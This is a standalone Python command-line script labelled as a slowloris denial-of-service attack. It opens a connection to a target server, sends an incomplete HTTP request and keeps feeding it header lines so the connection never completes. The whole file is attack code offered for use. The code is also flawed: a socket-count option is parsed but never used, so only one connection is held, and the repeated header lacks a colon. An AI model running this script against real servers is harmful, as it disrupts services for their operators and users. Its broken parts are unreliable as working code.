#!/usr/bin/env python3

import argparse
import socket
import sys
import time

parser = argparse.ArgumentParser(
    prog="slowloris", description="Perform slowloris attack on given target server"
)
parser.add_argument("ip", default="127.0.0.1", help="IP address of the target server")
parser.add_argument("-p", "--port", default=80, help="port of webserver [default: 80]", type=int)
parser.add_argument(
    "-c",
    "--socket-count",
    default=128,
    help="number of sockets to prepare for attack [default: 128]",
    type=int,
)
parser.add_argument(
    "-t",
    "--time",
    default=10,
    help="sleep time between two packets [default: 10]",
    type=int,
)
args = parser.parse_args()

request = [
    "GET /test HTTP/1.1",
    f"Host: {args.ip}:{args.port}",
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5",
    "Connection: keep-alive",
    "Keep-Alive: timeout=100, max=1000",
]
request = "\r\n".join(request)


def main():
    with socket.socket() as s:
        s.connect((args.ip, args.port))
        s.sendall(str.encode(request))
        while True:
            s.send(b"X-a 10000\r\n")
            time.sleep(args.time)


if __name__ == "__main__":
    main()
